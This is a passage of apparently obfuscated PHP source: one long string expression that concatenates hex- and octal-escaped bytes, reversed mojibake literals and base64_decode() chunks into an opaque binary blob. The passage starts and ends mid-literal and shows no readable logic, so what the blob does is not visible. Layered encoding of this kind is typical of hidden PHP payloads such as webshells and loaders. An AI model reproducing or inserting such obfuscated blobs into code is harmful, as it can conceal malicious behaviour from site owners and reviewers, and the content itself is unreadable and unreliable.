xdb\x7e\xf0\xf0\xb7\xd7\x3d\x33\xed\x8b\x7b\x6f\xbe\xf8\x99\xaa\x4b\x2e\xec\xfc\xe1\xce\xa7\x5f\x9f\x38\xf5\x6\xff\x8a\xb\xbe\x72\xf4\xe9\xd7\x4d\xd5\xe6\xdc\xf0\xa3\x87\x47\x1e\x1a\x3c\xf1\xc9\x9f".strrev('wÖyWñëu{îŸùµ+¾9ˆäsnğÊüĞ$uc~x]_êà©ñõsÿcşâd‰ê^4l¿Êñı').base64_decode('vTE5q78b+sM137t6y8iM35kfPnR59J+XDhz194fuix/61NPnf/T9u3579b67Xlzd3/Xl1Q==').base64_decode('s7xHXvGPU+66ZmLJvuz6x97/Re3qxitjq+fsPH3sub91Hpj43Zzj+s0h68b+35526cuJNQ==')."\375\251\265\333\222\333\316\353\215\335\134\137\267\360\265\324\13\77\276\365\353\77\332\360\253\153\356\136\363\313\77\115\372\315\207\217\46\237\131\376\361\376\203\36\237\370\304\42\345\246\77\336"."\x15\x7b\xa0\xf6\x4d\xbb\xf7\xee\xe4\xe2\xfc\x82\xa3\x8e\x79\xee\xe5\x6f\xfc\x3b\xfe\x9d\xf7\xbf\xf7\xe9\x21\xe1\xf5\xe7\xb4\xbd\xf9\x6a\x63\xef\x25\xea\xa9\xa9\xbd\x8b\x4e\xae\xd3\xbf\xf0\xc2\x71\xab\xaf\xdc".strrev('¯ü>ÏÛ†ù·Ş§{_{àø]/¦Åò=ûê|éÃzlÏÏğ>OÁá1ô?–ü¸Ş[“¥ò')."\x5b\x53\xa7\xcf\x3c\xe3\xb9\x3f\x17\x7f\xb3\x67\xe3\xca\x33\x4a\x57\x3e\xbb\xb1\xb7\x3f\xbd\xee\xce\x48\x6a\xe9\xbf\x7e\xb1\x64\x83\xef\x98\x7f\xbf\xf9\xc2\xd1\xf7\xe\x3d\xbc\x68\xfb\x1f\x67\xb4\x4f\x3a\xee"."\xc8\xc7\x72\x7\x2f\x7b\x2a\xfe\xc1\xa3\x9f\xfe\xfc\x82\x1f\x4f\xfa\xe8\xe2\xfa\x3f\x7d\xb8\xf3\xce\x27\x1e\xda\x78\xfd\x2b\x67\x5f\xf0\xcc\xb1\xb3\xff\xf6\xd6\xfd\x1f\x3e\x71\xb6\xf5\x42\xe3\x83\x77\x9f\x77"."\xec\xd\xfb\xa7\xfd\x2e\x50\x37\x55\x59\x3f\xed\xab\xad\xf\x7c\x21\xf3\xca\xb2\xd3\xae\xb8\x2f\x7a\xf5\xf0\xe1\x67\x6e\xbb\x62\xfb\xb7\x1e\xed\x98\x31\xf1\xdf\x97\x1f\x66\x5d\x9e\x7d\xb0\x66\xff\x95\x8b\x92"."\x8b\xf\x38\xac\xf0\x8a\xba\xec\x96\x77\xa6\xb4\xa5\x9f\xda\x38\xba\x74\xe1\xce\xae\x47\x9f\x2b\xfc\xe2\x67\x2f\xaf\xbc\xe9\x82\x17\x6\x9e\xf8\xde\x1b\xe9\xa7\xee\xb9\xe3\xdd\x67\xde\x9f\xf3\xc1\xfe\xcc\xea"."\167\225\327\362\353\357\335\131\272\343\256\45\377\214\74\173\313\231\73\117\335\75\257\264\363\255\137\246\277\221\377\323\137\246\374\163\316\234\261\217\43\353\232\132\276\277\347\326\335\352\266\113"."\x37\xfc\xfd\xdb\x9b\x8f\x3f\xef\x47\x77\x1e\xb8\xea\xe9\xe0\x6f\xe\xde\x7a\xf7\x33\xdd\x87\xfc\xfa\xd0\x89\xcf\x69\x5b\xf5\xbf\xbe\x63\x76\xd5\xfd\xea\xfe\xef\x7e\xf2\xc2\x13\x27\xde\x7a\xed\x25\xef\x5c\xd3".base64_decode('fcw7369afk/x0v3rdv/o0/1jnbd/9cz1H2w4pxD9S/Unr//2L/E5e5eFJm3Y6z33ybozwg==')."\107\237\335\124\252\372\352\157\176\126\374\317\307\377\372\346\323\173\356\371\340\37\373\226\250\237\274\375\361\15\73\236\376\364\235\53\337\331\74\377\356\217\77\170\341\221\343\77\371\317\77\316"."\213\75\175\355\332\343\216\176\353\347\67\76\355\377\364\337\355\157\176\364\344\265\76\365\276\173\77\176\367\241\167\324\117\377\371\361\105\233\175\367\177\362\342\37\276\171\355\377\274\377\362\265"."\xef\xdc\xee\xfb\xd9\x7f\x3e\xba\xe5\xea\xd7\x3\xcb\x3d\x4b\xef\xdf\xf7\xec\x75\xbd\x2f\xed\x5a\xfd\x5a\x6e\xcf\x7b\xef\x7d\xf4\xcb\xb1\x17\x2f\x59\xb1\x6d\xcf\x2f\x5e\x7c\xfe\x45\xf3\x7b\x77\xfc\xe9\xea\xfc"."\x8e\xf9\xb3\xe6\x36\xee\xf9\xf4\xaf\x13\x8f\xfd\xdb\x41\xd3\x16\xa4\xfe\x9e\x5e\x9f\x3d\x78\x77\xe2\xd5\x45\x9f\xda\x33\xd4\xab\xf4\xdb\xef\x5e\xa3\xbd\xf3\xd4\xe2\xdb\x2e\xbe\xe7\xa3\xe0\xf5\x37\xbf\x79\x49"."\333\203\37\117\75\375\231\157\14\157\75\376\314\267\132\246\56\273\65\163\347\6\377\304\137\77\163\341\155\53\257\273\350\254\47\326\75\163\156\335\235\137\70\343\255\117\17\10\264\136\366\321"."\xdb\x47\xb3\xcb\x6c\xa5\x15\xc3\x83\x45\x76\x40\xa\x4a\xb1\x29\x33\x20\x90\xb3\x46\xf0\x8d\x3\x10\x5b\xd3\xfd\x23\xab\xa\x70\x5a\x8\x46\x51\x66\x5f\x61\x55\xef\x8\x28\x89\x40\xb6\x9a\x35\xd\x4e\x65\xb"."\x3\xc6\x60\x66\x15\x28\xd3\xe0\x56\x4f\xd6\x4a\xad\xcc\x8c\xc0\xd6\x70\xfa\x6c\xb0\x93\xcc\x17\x32\xe9\x5c\x2f\x68\xce\x34\x7d\x85\xd9\x9f\x3\x31\x78\x1a\x54\x3a\x7b\x26\x34\xd\xbe\xd1\x0\x2d\x9c\x51\xf"."\125\114\233\65\33\122\146\102\326\110\272\77\237\113\301\336\252\144\344\127\146\355\125\64\62\234\263\206\112\46\64\142\132\75\53\10\277\205\322\300\140\337\12\70\261\236\71\35\32\136\310\255".base64_decode('sFMWlJkxHWBnzoIG5YZXpPK9bNOSGkkPsoPwWdOhC9NnwLjMnAqdmdkA1awYGMoV06AznQ==').base64_decode('NnMWG0iAyxQGS/Yw9GSov5jJrYQvTZkFlc+cBr1uYN2f3gBNG1yVK6Y06I9m2mm9BJutWQ==')."\xb3\xe0\x4b\xa9\x74\xdf\xd0\x8a\x11\x38\x53\x2c\x66\x53\xd8\xc6\x1d\x5a\xa6\x65\xac\x81\x5e\x6e\x24\x62\xf4\x16\xd8\x2d\x9d\x59\x33\xa6\x30\xc\xca\xa6\x7\xfb\x33\xac\x41\x50\x65\x66\x45\xef\x60\x61\x25\xec".base64_decode('+mY0sOnPD6f6BqEnM6bB3I1kC0axD2T3aYBaU6dATdkhzdRXAN4NI8BVI9AE1merf6i0Kg==').base64_decode('N8xQg7WgMLzK6F/BxhyGupQf1IbY3ZUZfG4YPmX7MiV+vWzq9GlsdAFuymyGd1OnsmYy8w==')."\xba\x42\x7a\xc4\xce\xc1\x30\x34\x4c\x85\xae\xd\x58\xf9\x95\xf6\x8a\x3e\xd6\x35\x98\xd0\x74\xbf\x66\xe\xac\xe0\x83\x33\x9b\x15\x62\x23\x9a\x1d\x48\xe5\x4c\x68\xf9\x60\x36\xaf\xf7\x69\xb0\xc4\x86\xec\xcc\x60"."\52\315\56\212\331\203\346\110\201\331\37\30\205\201\64\123\374\114\235\305\126\305\314\172\326\360\31\14\35\353\331\4\245\363\72\263\75\232\301\360\170\366\314\231\154\241\226\314\225\166\77\103"."\224\151\254\7\254\255\365\154\232\130\237\146\314\204\254\351\63\141\260\262\45\324\44\166\270\61\240\367\26\215\54\164\43\333\153\254\54\61\3\264\351\314\372\164\372\154\230\271\222\65\220\311"."\xb1\xcd\xeb\xb4\x6\xf8\xd2\xe0\x48\xff\x40\xc1\x80\x1\x1e\xb4\x57\xac\x32\x8a\x30\xe5\xc3\x2b\xfa\x86\x56\x96\x60\x6d\x4e\x81\xf6\xac\x4c\x67\x35\x9b\xd\xe2\xca\xc1\xa1\x94\xbd\x8a\x9d\xb8\x98\xc3\x5a\x31".base64_decode('D4M42LtS7x8BjMyO9Ot9Btum2/3ZEQNyhkeKJS0LSNiXtrXcABCToYylc6uWGYAVlpkbKA==').strrev('š7<´å÷‘¤'."\n".'ì\'\'É¸Õá©]Í•Ú·0E0'."\r".'KY¨¦'."\r".'7¡»"ì«ÛèÇ ¨lé¢yÙe')."\151\203\146\313\151\3\272\316\14\347\141\331\333\302\20\3\54\155\41\335\310\351\102\271\115\217\20\130\111\261\133\307\252\22\311\224\3\107\23\162\55\251\274\55\145\243\230\43\67\41\333\366".base64_decode('Q+9wC31yr5flGKJUOIoEha5lDZlFGLEBM53KmqW0o9Z0r6/CSNKeVMrpc6dzgx9VEwb9OA==')."\44\324\256\64\7\137\336\12\113\327\75\325\176\335\146\166\271\120\127\163\40\21\16\252\35\1\146\111\252\25\12\176\53\75\140\371\261\271\207\61\250\107\214\136\77\276\376\210\57\152\373\370"."\5\301\24\276\221\243\152\275\146\321\146\172\274\22\276\76\67\340\356\250\303\266\236\245\71\146\263\227\140\32\267\172\302\177\140\74\351\45\143\13\133\211\363\73\161\24\332\307\20\246\127\102"."\123\172\146\140\153\326\200\117\116\366\312\271\106\36\215\143\66\353\163\136\73\307\367\277\73\73\324\144\40\261\120\262\46\304\367\223\31\116\253\142\234\245\176\10\144\222\146\126\306\51\147\237"."\31\316\356\337\261\173\164\363\326\261\113\156\35\333\264\175\364\236\213\366\157\277\165\364\276\113\120\164\357\256\363\107\267\137\363\372\345\147\355\335\265\151\357\256\165\373\317\271\343\137\367\156"."\34\335\274\143\377\31\367\215\136\165\323\350\217\317\331\273\373\276\375\367\237\263\357\246\363\366\356\332\66\166\325\271\243\147\335\271\167\367\326\321\37\136\67\172\316\346\261\213\66\355\275\357"."\52\4\77\366\103\121\63\2\33\335\166\31\56\173\357\372\321\135\273\366\137\177\23\317\375\327\275\247\323\306\254\2\142\266\100\267\225\304\242\10\63\21\43\13\105\231\247\300\22\321\55\237"."\322\221\105\244\132\127\310\324\143\173\62\73\243\27\25\233\330\225\151\350\157\336\314\173\351\22\240\127\346\55\305\310\343\154\205\215\265\217\57\223\244\236\53\140\144\207\121\362\323\273\263\216"."\33\32\322\212\250\64\314\64\243\2\36\341\261\26\163\125\203\203\160\122\210\365\221\112\237\206\22\322\215\112\37\52\246\260\33\142\212\155\262\160\156\204\117\272\153\131\126\234\126\336\14\66".base64_decode('tf38WEBoq6Fh0tUbehRUhlJknTuJlIMCOMmbnOUcCVAnE6sGj0Kb4lHIWbbivCiOrRQYcw==').base64_decode('lNeM3PyiXsjyQy2ska04iK4uJCoMF++EIxOtx5JdAVAeVVlNbZjBLCKx4pCV2BOI5tKoUA==').base64_decode('j6MPcQpd1NMGM3TWcwQSiJdPOpyit6m4tXUKoX3Rce42d34hU8BeN+w588Hsn12rk9oAYQ==')."\161\73\114\116\315\272\317\362\370\42\151\151\226\174\137\140\260\106\257\327\53\351\234\205\265\33\16\101\165\342\110\33\245\205\360\12\36\57\275\205\133\172\240\245\335\337\257\133\166\43\271\144"."\xab\x4c\x56\x50\x43\x67\xf9\x1a\x50\x80\x2c\x82\xe9\xbe\x99\x28\x48\x46\xc\x16\x6e\x37\x8c\x62\xc9\x62\x57\x9e\x26\xf9\xa6\x81\x54\x69\xcd\x1\x33\x95\x39\x84\x7e\x34\x49\xcd\x87\x74\x51\xa\x31\xa\x96\x8a".strrev('š£—¿ê'."\0".'âwm•€'."\0".'†”i~ƒ«†¾E“hxÄú ÁöªÕ-”´sB¥§ÏYötnÙãÊ^$‚')."\136\304\44\323\26\261\225\5\256\1\125\132\222\117\202\270\300\50\134\234\14\327\147\24\265\345\51\57\40\106\234\347\106\262\126\126\143\147\242\26\276\274\223\327\71\376\225\54\176\154\203\15"."\312\125\44\121\130\2\127\325\64\23\26\43\341\146\265\45\14\146\224\201\216\260\232\110\304\44\316\116\356\62\57\125\27\306\132\324\140\54\266\60\14\70\326\50\321\74\174\167\122\34\161\343"."\230\270\103\211\217\205\144\143\66\131\314\301\156\71\60\343\114\50\140\364\211\260\70\330\26\210\163\123\373\351\276\172\137\203\200\105\37\124\361\125\203\46\166\317\77\221\14\304\53\70\147\241".base64_decode('TltgqMFRCxRoiy1RgrFIZ3s0QX2S0PRoTMonBtWQzVy3lGdD9aGOSCAYUsLRZIxdleA2rQ==')."\xe4\x92\x4c\x82\xc7\xd9\x10\x14\x2d\x9d\xbb\x66\x81\xf2\x34\x22\x5f\xe4\x91\x6b\xe4\x35\x1\x72\x76\x79\xaa\xbb\xab\xba\xeb\xba\x6b\xba\x6b\x97\xfb\xba\xad\x1e\xbf\xc4\x85\xc\x79\x7a\x20\xd2\xd1\x2\xdd\x6b"."\xe4\xa1\xb4\x5\xcb\xb2\x3d\x81\xd8\x37\xd\xc6\xe2\x81\x60\x84\x35\x5\x9\x78\x10\x8c\x5\xc3\x34\xb0\xef\xe2\xdb\xf6\xde\x73\xfe\xbe\x2b\xb7\x8f\x9e\xbb\x9\x55\x34\x76\xc5\xfa\xb1\x4b\xef\x44\x42\x7\x16"."\64\266\157\334\267\347\374\261\213\167\214\155\4\1\101\331\277\343\256\275\367\335\277\357\342\233\106\267\137\66\266\365\356\175\127\234\111\63\136\277\371\266\321\15\67\361\206\51\257\137\264\147"."\xec\xfc\x9f\x70\xe1\x83\xca\x1c\x1e\x54\xfa\xf5\xb3\x36\xed\xbb\x6f\x3b\x16\x3d\x6e\x58\x37\xb6\xf3\xbc\xb1\xab\x36\x8d\x6e\xb8\x7e\xf4\xf2\x9b\xf6\x9d\xbf\x63\xf4\x47\x67\x8c\x9e\xbd\x69\xff\x8e\x4b\x26\xba".base64_decode('EYnGu9hUwPVt/2n46j0d3m5rMh7aWvRbgy9goF9mR05sixd1hqLBkPsmkxwFvzZ1FEOouQ==')."\xd\x48\x9b\x16\xf8\xc5\x61\x71\xe2\x3\xa3\xa9\x7a\xdc\x56\xac\x81\xf9\x97\x1a\x25\x35\xa6\x25\x94\x8\xc6\xc3\xcd\x21\x30\xf1\xe7\x13\x35\x89\x48\x4a\x60\x6c\x81\x52\x13\xf1\xc5\x3c\xcc\xaf\xbe\x96\xf9\x21"."\x52\x6a\x18\x32\xd7\x2a\x8e\x8e\x68\xbe\x94\x99\x2d\xe5\xf2\xa4\xb1\x4a\x15\xb6\xfd\xaa\xf2\x60\xce\x42\xae\x55\x29\x55\x98\x4b\xa2\x4\x1d\x5f\xd8\xaf\xc1\x1e\x4a\x88\x89\x70\xf5\xb2\x6a\x4f\xbd\xa7\xa1\x56"."\x1\x27\x45\xb4\x4\xb8\x26\x52\xaa\xc0\xd2\x9c\x97\x73\x7c\xc4\xd3\xeb\x88\x35\x78\xea\x6b\x95\xaa\xc2\x40\x15\xb4\x4b\x8c\x2b\x6a\xbd\x4a\x21\x2d\x45\xf3\xd4\x40\x83\xe5\xe6\xa\x58\x44\x17\x2d\xbb\xa8\x19"."\150\217\242\244\74\74\211\227\107\277\16\167\103\51\237\50\101\347\11\101\270\323\224\100\264\305\11\111\275\24\165\124\23\103\315\224\317\346\256\116\330\64\127\327\52\275\160\161\242\102\46\51".strrev('D&¼ûàç€QáC“@İDÖ[:TáTÉR'."\n".'&ÅšY´rÛĞ¡½7Ï€±Ñ:LÔ`Ç&Œæ')."\170\6\233\101\234\316\47\261\102\36\161\37\125\105\245\71\332\317\234\325\317\110\35\134\313\157\137\306\373\300\160\131\141\42\6\167\76\205\357\375\205\222\301\66\212\345\11\11\315\323\275\223"."\x1c\x88\x2a\x86\x53\x71\xa0\x8\xdf\x12\x0\x1c\x5d\x2e\x98\x20\x4c\x20\x70\xe1\x68\x6b\x2c\xde\x4e\xef\xbb\x25\x82\x6d\xa1\xf6\x80\xf\x88\x38\xc5\x4\xa\x8f\xe5\x27\xa5\x49\xa9\xc6\x94\x8f\x26\x55\x3b\x86"."\237\174\210\15\131\222\174\25\255\53\325\106\302\20\35\205\102\77\64\6\146\137\41\376\5\64\122\244\251\232\272\200\201\52\271\227\264\130\74\251\242\1\0\362\54\121\335\152\211\133\110\346"."\344\370\366\326\40\223\345\373\220\164\143\62\205\140\272\227\71\123\103\225\343\72\203\261\150\153\230\135\355\153\201\235\157\41\155\72\200\132\342\141\354\341\3\276\257\260\252\244\13\225\50\42"."\114\73\120\244\60\224\346\141\341\64\1\147\160\236\217\42\202\345\243\10\147\66\30\112\362\372\206\277\237\210\362\260\20\140\121\244\63\301\156\166\140\352\273\244\205\207\333\370\375\166\234\21"."\x8b\x4b\x91\x40\x3c\xd0\x9e\xe0\xd1\xf8\x12\x7e\x53\x84\xa7\xd1\x1b\x23\x6a\xb4\xb3\x5d\x50\xfc\x48\x60\x31\x42\x96\x98\x10\x50\x18\xb5\xae\xf1\xd5\xcd\xaf\xed\xa6\x97\xf0\x68\x90\xfe\x9c\xcc\x62\xf8\x62\x52"."\317\352\6\217\62\143\155\55\300\160\117\31\166\306\310\63\11\22\177\145\121\104\215\304\26\320\70\361\106\27\312\247\305\176\103\351\122\220\70\233\24\342\254\305\130\27\137\15\12\302\141\205".strrev('û5š†8¹tl`(wÛ’qbaY¥®©qrÖ	·P÷WZÌïá€ÊLàá%±¢Ué^')."\231\373\42\104\20\231\270\100\177\227\262\0\241\225\120\40\105\256\73\17\363\106\4\274\247\252\335\153\272\117\352\366\372\350\115\106\54\274\164\173\104\223\324\320\122\304\143\23\11\307\65\114"."\x95\x38\xea\x82\xda\x51\x2f\x21\x44\x57\x2d\x8d\xcc\x85\x1f\xd8\x51\xcd\x5\x69\x1f\xa2\xf3\x9a\xf8\x64\x86\x16\xad\x89\xa2\xbf\xb\x92\x6b\x42\xe8\x6f\x4\xfd\x44\x92\x68\xba\xc\xe\x80\x96\x64\x24\xbc\x30"."\264\6\377\43\62\152\371\100\322\13\113\316\2\341\350\32\364\57\42\60\153\302\121\167\145\315\241\344\222\120\210\2\260\60\374\12\120\104\160\240\253\222\267\102\174\211\0\262\305\245\2\250"."\x5a\x55\x6b\xc8\x60\x7a\x7b\x26\xd7\xaa\xaa\xdf\xea\x4\x7c\xe1\xae\x40\x6a\xaa\x4f\x6c\xa8\x6\x1e\x12\x48\x4\x5\xf5\x75\x20\x44\x39\x2e\x10\x93\x7f\x27\x22\x70\x1f\x7c\x10\x5f\x10\x8f\x75\x76\x48\xf1\xb6"."\300\342\160\164\1\213\371\353\130\250\16\252\126\132\302\11\64\104\101\206\214\302\65\240\34\7\201\223\210\105\262\324\353\100\351\26\104\331\121\104\22\331\361\146\200\122\146\347\52\153\356\14".strrev('E	;¼e!BˆE‹†F,'."\0".':`1‹ ˜YÈx"Î|¹8±Æ±&SÀê¡'."\n".'ç+äZG')."\131\36\332\371\241\135\33\333\316\145\264\101\176\165\162\116\272\127\362\23\202\151\260\217\152\274\260\267\30\264\125\324\270\166\323\245\244\44\372\45\151\73\117\315\0\25\351\352\66\326\166\112"."\72\41\77\205\100\302\47\201\101\277\335\313\347\23\341\170\71\303\123\172\153\330\116\32\166\326\361\121\270\135\210\76\32\46\127\72\245\317\262\133\30\104\271\247\232\222\312\233\360\155\71\101"."\250\223\250\176\34\64\261\102\133\203\255\41\211\216\226\106\235\73\52\116\246\226\363\215\22\270\135\360\300\57\264\350\10\372\323\15\121\246\231\350\206\217\124\173\200\351\166\63\201\275\253\173".base64_decode('uL7ei/6Zhf42o79B9DeEE1q7h2e2osDs1h4/GJmzSxxORXl3d9V4gwwAbKghWkWjrJTBOQ==')."\x67\x2a\x83\xdd\xd7\xa8\x76\x8e\x69\xbd\xc9\x16\x4f\xa8\x9b\xa9\xe2\x5b\xc4\x5b\xe2\xb1\xe\x2a\xc7\x28\xe1\x56\x85\xfa\x72\x50\xaa\xa9\xaa\xbc\x1a\x4\xb4\x60\x3c\x84\xd7\x18\x85\x62\x79\x35\xd5\xe\x55\xd5"."\274\152\5\356\167\327\72\113\205\243\55\241\245\112\265\221\36\126\65\115\205\302\12\132\321\254\42\245\254\46\126\3\155\53\73\161\312\230\103\212\214\244\154\327\35\244\151\111\201\270\145\2".base64_decode('HvHKwO7SemBrz3OoXE2zwgnE9iMR0lOUZVhYHPYo3HkCTsRbGKr2hIpYBq2IZoWWJuMBnA==')."\110\144\330\103\47\240\77\204\54\341\75\126\61\247\321\13\246\104\362\363\55\7\125\303\162\207\240\111\105\120\54\152\2\336\21\306\51\365\211\347\20\175\3\35\146\131\33\261\20\144\167\32"."\353\210\207\333\3\361\145\60\144\142\47\1\13\327\314\72\256\31\213\210\141\165\112\27\335\243\250\325\362\305\167\72\307\234\116\243\135\61\243\323\250\65\64\130\205\147\236\6\301\357\254\312"."\xef\x31\x33\x55\x4c\xd\xbb\xf\xec\x61\x1\xe6\x48\x82\x5c\xb5\x62\x5a\xac\x1c\x22\x5c\x3c\x26\x66\xd\x70\x1f\x66\x45\xce\x95\x2f\x8b\x9\xc7\xb8\x98\xd5\xe2\x49\x66\x3c\xa3\x35\xd0\x19\x91\x53\x60\xa8\x94".strrev(''."\0".'a."¦2gt8'."\n".'´&÷Ü8gcÊ[gh)š‹‹¨ÿC¦jAµ|:”Ç–­+KXF±Ÿe¡…')."\75\342\303\52\265\127\332\275\313\223\2\325\140\0\356\145\370\63\272\306\140\52\165\215\227\347\372\253\120\164\101\70\32\152\152\37\11\47\2\355\12\153\70\150\350\260\307\315\131\120\117\70".base64_decode('pkaQZK3KSrhwDBTADneOqir8o/g0YVhuF0uSczzDJEbc7fy+B7E6RwgREO4RuJKa5JV6cQ==').base64_decode('aZnpQXmX11TDbMQ5GJjKOnMEuOr4uNtqW04WBuXidJkdYHPnelCgU3JvgAsr7IPkNCfvbA==')."\x1e\x62\xb3\x59\xe6\xe0\x4a\xd5\x45\x6f\x72\xba\x65\xf1\x53\xe6\x64\x46\x57\xac\x82\x9e\x22\x6e\x3a\x15\x70\x2e\xa7\xa4\x4d\xdd\x12\x7e\xbd\x61\xec\xc9\x6e\x8b\x5\xed\x8c\x70\x4\x21\xfb\xb7\x6d\x69\x66\x83"."\x5c\xca\xdb\x9\x3d\xb\xca\xf9\x96\x5e\x62\xb9\x2f\xee\xd8\x89\x3b\x4d\x92\x45\x3f\x39\x63\x11\x33\x47\xbd\xf6\xb9\xa\x42\x4d\x61\x3e\x34\x12\x94\x48\x8c\x8\x87\xb6\xf8\x48\x43\xd4\xd9\xc3\x74\x6\x62\x3c".base64_decode('VhmMCboPAXkj82aHXswZ5BxniTimAT6DKqDz71Nc5eRRx2d/ZZDY4cVnzSHzbUZaJl2wxA==')."\121\300\25\174\220\51\135\133\51\345\321\107\274\362\105\50\204\73\44\121\272\172\301\134\34\322\330\114\60\341\100\370\11\201\176\110\141\277\105\226\343\23\16\162\110\235\130\252\362\12\207\25"."\151\115\276\163\52\171\206\237\50\143\12\231\162\201\333\175\206\354\275\302\47\174\2\363\345\162\62\237\50\174\27\33\116\323\261\300\336\247\112\155\351\340\360\302\33\50\35\15\151\32\110\2"."\15\222\5\256\64\212\106\264\31\30\377\107\44\334\221\122\333\231\63\47\360\110\34\61\373\71\155\102\202\53\170\14\163\320\247\160\14\312\372\164\174\21\213\136\213\11\161\207\216\250\40\165"."\x7b\xf7\xf9\x85\x3a\x25\xa7\xcc\xe3\x90\x94\x8a\xe5\x82\x0\xc8\x3f\x58\x24\x4a\xa7\xcf\xff\x60\x5c\x17\x5c\x1f\x15\x23\xf7\xde\x3e\xb7\x90\x20\xb1\xe4\x4b\xa4\x90\x44\x96\x5d\x65\x8\x3a\xd2\x3b\x3a\x30\xf3"."\x19\xc8\x16\x38\x86\x78\x41\x34\xa6\xb6\x21\x76\x13\x63\x42\x89\x61\x25\x1d\xe4\x9d\x95\x2\x12\x62\x23\x99\x29\xe5\x27\xb7\x88\x61\xe3\x38\x87\x58\xb\xd0\xf3\x4b\x98\xec\xd5\x88\x72\xf3\x10\xb3\xf5\x0\xdf"."\x60\x42\x18\x8\xd0\x9f\x65\xb9\xb4\x17\x35\x1c\xb0\x2e\xad\xdb\xdc\x35\x13\xa6\x82\xec\xf6\x25\x6e\xb3\x74\x7\x3b\xc7\x9\xec\x90\xe4\x85\x55\x1b\xd4\xf1\x35\x37\xa6\x96\x29\x33\xdf\x81\xae\x94\x77\xe\x9a"."\210\317\315\22\261\316\70\73\343\301\161\254\333\122\343\241\340\62\176\334\302\123\133\3\213\335\51\141\254\233\14\54\250\230\314\65\146\70\235\154\115\325\170\14\253\26\103\221\126\127\201\104"."\x1b\xf7\xe0\xeb\x4c\x53\x23\xe1\xe8\xc2\x8a\x19\x48\x34\x69\x97\x8a\xd0\xc4\x70\x32\xd4\xee\x4e\x73\xd6\x90\x8\x5\xe2\xcc\xbd\x34\x8e\x37\x47\x62\x41\x29\x3b\x1c\x2b\x1f\x9\x2e\xfb\xf0\x44\xaa\x98\xa4\x89".strrev('bÒ%‹|ÀNèÓæ1l“øî’¹(Ş+¯¾·Mmm{¿;\\™íW†'."\r".'`×¥Ú#Q]“WºjÓş')."\20\363\373\174\360\21\36\360\167\373\231\377\57\277\310\204\137\1\177\202\213\307\200\73\367\4\165\246\344\150\250\313\347\10\273\344\357\163\337\105\123\331\5\64\106\131\265\76\146\45\20\246"."\xc7\xb7\x6a\x62\x59\x82\xcf\x95\x33\xcd\x81\x91\x14\xa7\x65\x63\x9\x17\x30\xfa\xdb\x21\x83\x62\x3b\x9c\x8a\x80\xe\x94\x76\xdc\xad\x96\x93\x7c\x86\x29\x56\x8b\x58\xd6\x69\x33\x55\xc2\xee\x9b\xc4\x1c\x89\x9b"."\xd8\x28\xc9\xe7\xa8\x2\x11\xf4\x1\xa1\x1d\x80\x55\x99\x60\xab\x37\x8f\x78\x25\x30\xe3\x20\x92\x5a\x17\xb4\x85\x4f\x59\x18\x69\x8f\xc6\x3a\x16\xc5\x13\xc9\xce\xc5\x4b\x96\x2e\x3\x8f\x93\x8d\xc\x69\xfa\x14".base64_decode('L9OFgONb/6BW9A8yV/6L8aZDt/yyMMcTUR+xW2LmUY2qMHguph7+ylm0Nn8ubzeMA9FR1A==')."\173\115\323\36\47\167\161\373\147\127\14\231\135\335\126\17\307\322\264\76\10\101\141\310\146\211\255\26\10\31\136\371\111\1\214\255\262\274\230\356\165\111\3\220\40\14\371\44\231\101\44\162"."\xc7\xd4\x34\x3a\xa2\xb\xb3\x44\x73\x48\x72\xec\xcc\x16\xcd\x4a\xe2\x43\xd4\xed\x80\x74\xa5\x57\x1b\x70\xe4\xb\x77\xce\x2b\xbd\x68\xfb\xe9\x88\xbb\x9c\x90\x9e\x44\x68\x7c\xbb\xd9\x5f\x9c\xe2\xb7\x71\x4b\xf2"."\x88\x2f\xc0\xd7\x40\x52\x90\x97\x1\xe1\x15\xdc\x9e\x7\x73\xa4\x36\xd7\x22\xe4\x89\xdc\x29\x47\x82\xd8\x5b\x36\x2a\xd3\xc0\x9\x7f\x2b\x92\xa9\xd3\x4a\x17\x15\x93\x41\xa5\x8f\x45\x2c\xe2\x47\x9e\x46\x3d\x8a"."\x70\x77\xcd\x94\xb1\x4e\x3f\xd6\x6c\x1d\x60\xbd\x99\x74\x9b\x36\x25\xbb\x64\x60\x54\x35\x37\x20\xc\xc4\x72\x3\xdc\xc8\x23\xe5\x90\x2a\x30\x3\x6f\x95\xec\xc8\x84\xe0\x0\xaf\x65\xa0\xbc\xe6\x11\x66\x9b\xb"."\167\124\233\107\342\322\73\100\16\167\30\362\373\42\132\241\20\314\340\76\70\26\247\43\51\45\107\372\260\151\212\154\322\342\164\246\215\262\133\250\364\226\346\360\226\10\161\207\250\175\222\253".base64_decode('1LIakKSXD7Hr+GW5SCw0RPZnt6WdDC8Hhp0BYD3jCRZbbScNe03L8haKJrZcazJy/X5rCA==').base64_decode('8rKaZS92uCn6XF/a2BtHO5eToQnDXoLV7COSMOMvEstezxDwBQ9xoKnWM4Txo7b5sX9FIg==')."\xd0\x72\x83\xb3\x58\x82\x9d\xff\x38\x7b\x4f\xdf\x88\x92\xb6\xd8\xe0\xe2\x8d\xfb\x8f\xe6\xde\xa5\x85\xb\x6a\xaa\xb6\xa7\x61\xe1\x1b\x17\xc9\xe5\x81\x7e\xec\x9c\xc4\xcc\xb3\x57\x70\xe8\xdb\x4\xb2\x8f\xf3\xb4"."\116\232\313\257\343\113\356\301\361\373\30\150\251\63\233\74\311\121\70\222\364\372\371\64\22\167\300\262\333\105\74\344\336\234\343\131\14\72\101\116\367\333\226\256\17\60\33\102\74\333\202\242".base64_decode('FLmXdHqa662Y4JWsAul6kp5LwJ+DDX6GPsQA7aU/p1ZqvbcoHJej2aHPOizUR5gvcBeZcw==')."\271\17\357\136\320\335\336\235\224\273\153\27\265\276\76\324\130\311\241\252\243\55\302\133\71\140\23\171\342\204\15\301\370\276\316\341\250\342\244\212\256\322\41\63\116\373\36\304\333\252\141\374"."\376\204\360\350\331\31\217\70\316\237\0\224\365\162\125\306\33\144\6\136\146\51\233\46\133\125\364\51\63\213\166\351\342\44\172\354\322\353\306\176\161\311\376\373\257\31\73\377\47\173\167\355"."\x1e\xbb\xea\x1e\x9a\x4e\x47\xad\x45\xcf\xf3\xb9\x1f\x3b\xef\xc2\x7d\xbb\xaf\xde\xbf\xfd\xfe\xd7\x2f\xdd\xfe\xaf\x7b\x37\xee\xdf\x71\x17\xb6\x34\xba\xf6\x27\xd4\xf0\x68\x74\xf3\xfa\xb1\x4b\x6e\x1d\xdd\xbc\x61"."\xff\xce\x33\xc7\xee\xd9\x32\x76\xf5\x19\xaf\x5f\xbe\xe5\xb5\x75\xeb\x61\xf5\xe4\x89\x6b\xd1\x40\xb1